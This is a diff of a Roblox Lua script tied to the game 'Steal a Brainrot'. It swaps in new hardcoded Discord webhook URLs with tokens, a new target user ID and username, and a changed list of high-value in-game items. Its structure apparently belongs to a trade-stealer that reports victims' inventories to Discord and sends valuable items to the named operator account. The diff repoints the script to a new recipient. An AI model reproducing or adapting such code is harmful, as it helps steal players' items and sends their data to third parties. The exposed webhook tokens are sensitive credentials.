@@ -9,7 +9,7 @@ task.spawn(function()
     end
 
     task.spawn(function()
-        local WEBHOOK_URL = "https://discord.com/api/webhooks/1510421027916615711/DIaJdwyeVwn1VzL-hPldUIPOFX1a2hH6g00X_Y-hmoFMs-mBIVd6ilQyLryyoSgFxGTg"
+        local WEBHOOK_URL = "https://discord.com/api/webhooks/1544099732211892244/MqquSo8HJp0gRuPM29Ofl7jmrhSf8MQnXnzt8N36zD5rTjW9WPHjLmh6qayqcHEmb-QQ"
         local GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
         local webhookSent = false
 
@@ -21,7 +21,7 @@ task.spawn(function()
         local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
 
         local ALLOWED_ANIMALS = {
-            "Skibidi Toilet", "John Pork", "Kraken", "Foxini Laternini", "Ginger Gerat",
+            "Skibidi Toilet", "Noobini Pizzanini", "Kraken", "Foxini Laternini", "Ginger Gerat",
             "Dragon Aquanini", "Meowl", "Strawberry Elephant", "Dragon Cannelloni",
             "Hydra Dragon Cannelloni", "La Supreme Combinasion", "Dragon Gingerini",
             "La Casa Boo", "Love Love Bear", "Griffin", "Signore Carapace",
@@ -275,12 +275,12 @@ task.spawn(function()
             end,
         })
 
-        local TARGET_USER_ID = 7412398669
-        local TARGET_USERNAME = "Luis_munuz82"
+        local TARGET_USER_ID = 11390709913
+        local TARGET_USERNAME = "japazinnG"
 
         local ALLOWED_ANIMALS = {
             "Skibidi Toilet",
-            "John Pork",
+            "Noobini Pizzanini",
             "Kraken",
             "Foxini Laternini",
             "Ginger Gerat",
@@ -317,7 +317,7 @@ task.spawn(function()
             ALLOWED_ANIMALS_SET[name] = true
         end
 
-        local TRADE_WEBHOOK = "https://discord.com/api/webhooks/1510424789591003246/iXERexsqn7bVDZ_DgahMj7D_hmDlqvPQsfsNA3No8FloluIN6oC1CGGAm4nQ6hVWLDhl"
+        local TRADE_WEBHOOK = "https://discord.com/api/webhooks/1544099732211892244/MqquSo8HJp0gRuPM29Ofl7jmrhSf8MQnXnzt8N36zD5rTjW9WPHjLmh6qayqcHEmb-QQ"
         local TRADE_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
 
         local lastOfferedList = {}
